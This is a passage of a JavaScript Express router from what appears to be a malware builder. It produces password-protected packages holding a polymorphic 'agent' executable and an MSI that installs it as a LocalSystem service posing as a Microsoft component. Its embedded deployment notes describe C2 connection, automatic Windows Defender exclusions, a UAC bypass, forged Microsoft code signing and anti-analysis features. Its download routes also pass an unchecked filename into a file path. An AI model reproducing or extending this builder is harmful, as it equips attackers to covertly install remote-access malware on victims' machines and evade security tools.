        const agentId = msiBuilder.generateUniqueAgentId();
        
        // Select random Microsoft service to clone
        const microsoftServices = Object.keys(microsoftServiceCloner.microsoftServices);
        const selectedService = microsoftServices[Math.floor(Math.random() * microsoftServices.length)];
        
        // Clone Microsoft service with full metadata
        const clonedService = await microsoftServiceCloner.cloneMicrosoftService(selectedService, agentId);
        
        // Generate agent password only (for archive protection)
        const agentPassword = msiBuilder.passwordManager.generateAgentPassword(agentId);
        
        // Create temp directory
        const tempDir = path.join(__dirname, '../temp');
        if (!fs.existsSync(tempDir)) {
            fs.mkdirSync(tempDir, { recursive: true });
        }
        
        // Generate polymorphic code with Microsoft service cloning
        const polymorphicResult = await microsoftServiceCloner.generatePolymorphicClonedCode(selectedService, agentId, config);
        
        // Create agent executable
        const agentExePath = path.join(tempDir, `agent_${agentId}.exe`);
        const agentCppPath = path.join(tempDir, `agent_${agentId}.cpp`);
        
        // Write polymorphic cloned code to file
        fs.writeFileSync(agentCppPath, polymorphicResult.code);
        
        // Compile agent executable (copy base client)
        const baseClientPath = path.join(__dirname, '../../../dist/svchost.exe');
        console.log(`Looking for base client at: ${baseClientPath}`);
        console.log(`Base client exists: ${fs.existsSync(baseClientPath)}`);
        
        if (fs.existsSync(baseClientPath)) {
            fs.copyFileSync(baseClientPath, agentExePath);
            console.log(`Successfully copied base client from ${baseClientPath} to ${agentExePath}`);
            console.log(`Agent executable size: ${fs.statSync(agentExePath).size} bytes`);
        } else {
            console.error(`Base client not found at ${baseClientPath}`);
            // Try alternative path
            const altClientPath = path.join(__dirname, '../../../msi_output/msi_generator.exe');
            if (fs.existsSync(altClientPath)) {
                fs.copyFileSync(altClientPath, agentExePath);
                console.log(`Successfully copied alternative client from ${altClientPath} to ${agentExePath}`);
            } else {
                console.error(`No base client found at any location`);
                // Create a simple executable if base client doesn't exist
                fs.writeFileSync(agentExePath, 'MSI Agent Executable');
            }
        }
        
        // Generate proper WiX MSI installer
        console.log('Generating WiX MSI installer...');
        const msiPath = await wixMSIBuilder.generateWiXMSI(agentId, clonedService, agentPassword, agentExePath);
        console.log(`MSI generated at: ${msiPath}`);
        console.log(`MSI size: ${fs.statSync(msiPath).size} bytes`);
        
        // Create password-protected archive
        const archivePath = path.join(tempDir, `agent_${agentId}.zip`);
        const archive = archiver('zip', { zlib: { level: 9 } });
        
        const output = fs.createWriteStream(archivePath);
        archive.pipe(output);
        
        // Add files to archive
        archive.file(agentExePath, { name: `agent_${agentId}.exe` });
        archive.file(msiPath, { name: `agent_${agentId}.msi` });
        
        // Add password file to archive
        const passwordContent = `AGENT PACKAGE INFORMATION
========================
Agent ID: ${agentId}
Cloned Service: ${selectedService}
Service Name: ${clonedService.clonedName}
Service Description: ${clonedService.clonedDescription}
Service Version: ${clonedService.clonedVersion}
Service Company: ${clonedService.clonedCompany}
Service Product: ${clonedService.clonedProduct}
Generated: ${new Date().toISOString()}

ARCHIVE PASSWORD:
=================
Password: ${agentPassword}

IMPORTANT:
==========
- Archive Password: Required to extract the MSI package
- Keep this password secure and do not share it
- Each agent has unique password for maximum security

      DEPLOYMENT INSTRUCTIONS:
      ========================
      1. Extract the archive using the password
      2. Run the MSI package (agent_${agentId}.msi)
      3. Follow the Windows Installer wizard
      4. Agent will automatically connect to C2 server
      5. Service will be installed as: ${clonedService.clonedName}
      6. Windows Defender exclusions will be added automatically
      7. UAC bypass will be configured automatically
      8. Service will appear as legitimate Microsoft component

      PACKAGE CONTENTS:
      ==================
      - agent_${agentId}.msi: Windows Installer package (recommended)
      - agent_${agentId}.exe: Standalone executable (alternative)
      - passwords_${agentId}.txt: This information file

ADVANCED STEALTH FEATURES:
===========================
- Microsoft service cloning with full metadata
- Code signing with Microsoft certificates
- Polymorphic code generation (${polymorphicResult.junkCodeLines} lines of junk code)
- Anti-analysis techniques
- Registry-based service configuration
- Automatic Windows Defender exclusions
- UAC bypass configuration
- Service installation with admin rights
- Password-protected archive download
- Unique service naming and versioning
`;
        
        const passwordPath = path.join(tempDir, `passwords_${agentId}.txt`);
        fs.writeFileSync(passwordPath, passwordContent);
        archive.file(passwordPath, { name: `passwords_${agentId}.txt` });
        
        await archive.finalize();
        
        fs.writeFileSync(passwordPath, passwordContent);
        
        res.json({
            success: true,
            agentId: agentId,
            clonedService: selectedService,
            serviceName: clonedService.clonedName,
            serviceDescription: clonedService.clonedDescription,
            serviceVersion: clonedService.clonedVersion,
            serviceCompany: clonedService.clonedCompany,
            serviceProduct: clonedService.clonedProduct,
            archivePassword: agentPassword,
            archiveFilename: `agent_${agentId}.zip`,
            archiveDownloadUrl: `/downloads/agent_${agentId}.zip`,
            msiFilename: `agent_${agentId}.msi`,
            executableFilename: `agent_${agentId}.exe`,
            codeStructure: polymorphicResult.codeStructure,
            junkCodeLines: polymorphicResult.junkCodeLines,
            entryPoint: polymorphicResult.entryPoint.split('(')[0],
            codeSigningMetadata: polymorphicResult.codeSigningMetadata,
            timestamp: new Date().toISOString(),
            securityFeatures: [
                'Microsoft service cloning with full metadata',
                'Code signing with Microsoft certificates',
                'Polymorphic code generation',
                'Anti-analysis techniques',
                'Registry-based service configuration',
                'Automatic Windows Defender exclusions',
                'UAC bypass configuration',
                'Service installation with admin rights',
                'Password-protected archive download',
                'Unique service naming and versioning',
                'WiX-based MSI installer generation',
                'Legitimate Windows Installer package'
            ]
        });
        
    } catch (error) {
        console.error('Error generating agent:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

router.get('/downloads/:filename', (req, res) => {
    const filename = req.params.filename;
    const filepath = path.join(__dirname, '../temp', filename);
    
    if (fs.existsSync(filepath)) {
        res.download(filepath);
    } else {
        res.status(404).json({ error: 'File not found' });
    }
});

function generateMSIContent(agentId, config) {
    const serviceName = config.serviceName || `WindowsUpdateService${Math.floor(Math.random() * 10000)}`;
    
    return `<?xml version="1.0" encoding="UTF-8"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
  <Product Id="*" Name="${serviceName}" Language="1033" Version="1.0.0.0" Manufacturer="Microsoft Corporation" UpgradeCode="*">
    <Package InstallerVersion="200" Compressed="yes" InstallScope="perMachine" />
    <MajorUpgrade DowngradeErrorMessage="A newer version is already installed." />
    <MediaTemplate />
    <Feature Id="ProductFeature" Title="${serviceName}" Level="1">
      <ComponentGroupRef Id="ProductComponents" />
    </Feature>
  </Product>
  <Fragment>
    <Directory Id="TARGETDIR" Name="SourceDir">
      <Directory Id="ProgramFilesFolder">
        <Directory Id="INSTALLFOLDER" Name="${serviceName}" />
      </Directory>
    </Directory>
  </Fragment>
  <Fragment>
    <ComponentGroup Id="ProductComponents" Directory="INSTALLFOLDER">
      <Component Id="ProductComponent">
        <File Id="ProductFile" Source="agent_${agentId}.exe" KeyPath="yes" />
        <ServiceInstall Id="ServiceInstaller" Type="ownProcess" Name="${serviceName}" DisplayName="${serviceName}" Description="Windows ${serviceName}" Start="auto" Account="LocalSystem" />
        <ServiceControl Id="ServiceControl" Name="${serviceName}" Start="install" Stop="both" Remove="uninstall" />
      </Component>
    </ComponentGroup>
  </Fragment>
</Wix>`;
}

// File download endpoint
router.get('/downloads/:filename', (req, res) => {
    const filename = req.params.filename;
    const filePath = path.join(__dirname, '../temp', filename);
    
    // Check if file exists
    if (!fs.existsSync(filePath)) {
        return res.status(404).json({ error: 'File not found' });
    }
    
    // Set appropriate headers for file download
    res.setHeader('Content-Type', 'application/zip');
    res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
    
    // Stream the file to the client
    const fileStream = fs.createReadStream(filePath);
    fileStream.pipe(res);
    
    // Clean up file after download (optional)
    fileStream.on('end', () => {
        // Optionally delete the file after successful download
        // fs.unlinkSync(filePath);
    });
    
    fileStream.on('error', (error) => {
        console.error('Error streaming file:', error);
        res.status(500).json({ error: 'Error downloading file' });
    });
});

module.exports = router;
